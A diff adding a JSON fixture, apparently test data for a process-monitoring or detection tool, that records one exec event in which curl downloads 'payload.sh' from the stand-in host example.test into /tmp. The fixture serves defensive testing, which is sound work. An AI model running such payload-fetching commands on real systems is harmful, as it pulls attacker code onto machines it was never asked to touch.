@@ -1,0 +1,13 @@
+{
+  "type": "exec",
+  "meta": {
+    "pid": 4242,
+    "ppid": 1337,
+    "user": { "os": "unix", "uid": 1000, "gid": 1000 },
+    "timestamp_ns": 1756900000123456789,
+    "comm": "bash"
+  },
+  "image_path": "/usr/bin/curl",
+  "cmdline": "curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh",
+  "argv": ["curl", "-fsSL", "https://example.test/payload.sh", "-o", "/tmp/payload.sh"]
+}
